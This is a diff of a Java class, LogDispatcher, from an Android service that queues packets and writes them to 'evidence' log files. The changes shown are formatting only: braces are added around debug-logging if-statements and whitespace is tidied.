@@ -28,7 +28,7 @@ import com.android.service.util.Check;
  */
 public class LogDispatcher extends Thread implements Runnable {
 	private static final String TAG = "LogDispatcher";
-	
+
 	/** The singleton. */
 	private volatile static LogDispatcher singleton;
 
@@ -115,8 +115,9 @@ public class LogDispatcher extends Thread implements Runnable {
 			break;
 
 		default:
-			if (Cfg.DEBUG)
-				Check.log( TAG + " Error: " + "processQueue() got LOG_UNKNOWN");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + "processQueue() got LOG_UNKNOWN");
+			}
 			break;
 		}
 
@@ -147,8 +148,9 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	@Override
 	public void run() {
-		if (Cfg.DEBUG)
-			Check.log( TAG + " LogDispatcher started");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " LogDispatcher started");
+		}
 
 		// Create log directory
 		sdDir = new File(Path.logs());
@@ -169,8 +171,9 @@ public class LogDispatcher extends Thread implements Runnable {
 				if (halt == true) {
 					queue.clear();
 					evidences.clear();
-					if (Cfg.DEBUG)
-						Check.log( TAG + " LogDispatcher closing");
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " LogDispatcher closing");
+					}
 					return;
 				}
 
@@ -235,8 +238,9 @@ public class LogDispatcher extends Thread implements Runnable {
 	 * @return true, if successful
 	 */
 	private boolean createLog(final Packet p) {
-		if(Cfg.DEBUG) Check.ensures(!evidences.containsKey(p.getId()),
-				"evidence already mapped");
+		if (Cfg.DEBUG) {
+			Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped");
+		}
 
 		final byte[] additional = p.getAdditional();
 		final Evidence evidence = new Evidence(p.getType());
@@ -255,8 +259,9 @@ public class LogDispatcher extends Thread implements Runnable {
 	 *            the p
 	 */
 	private void atomicLog(final Packet p) {
-		if(Cfg.DEBUG) Check.ensures(!evidences.containsKey(p.getId()),
-				"evidence already mapped");
+		if (Cfg.DEBUG) {
+			Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped");
+		}
 
 		final byte[] additional = p.getAdditional();
 		final byte[] data = p.peek();
@@ -276,8 +281,9 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private boolean writeLog(final Packet p) {
 		if (evidences.containsKey(p.getId()) == false) {
-			if (Cfg.DEBUG)
-				Check.log( TAG + " Requested log not found");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Requested log not found");
+			}
 			return false;
 		}
 
@@ -296,8 +302,9 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private boolean closeLog(final Packet p) {
 		if (evidences.containsKey(p.getId()) == false) {
-			if (Cfg.DEBUG)
-				Check.log( TAG + " Requested log not found");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Requested log not found");
+			}
 			return false;
 		}
 
